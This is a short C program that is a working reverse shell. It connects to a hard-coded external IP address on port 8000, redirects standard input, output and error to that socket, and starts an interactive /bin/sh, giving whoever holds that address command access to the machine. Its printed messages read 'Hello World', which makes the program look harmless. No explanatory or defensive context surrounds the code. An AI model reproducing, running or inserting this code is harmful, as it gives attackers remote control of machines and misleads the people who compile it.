#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define TARGET_IP "94.74.110.167"
#define TARGET_PORT 8000

int main() {
    int sock;
    struct sockaddr_in addr;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(TARGET_PORT);
    addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    printf("[*] Hello World %s:%d...\n", TARGET_IP, TARGET_PORT);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }
    
    printf("[+] Hello World! \n");
    
    dup2(sock, 0);  // stdin
    dup2(sock, 1);  // stdout
    dup2(sock, 2);  // stderr
    
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
    
    perror("execve");
    close(sock);
    return 1;
}
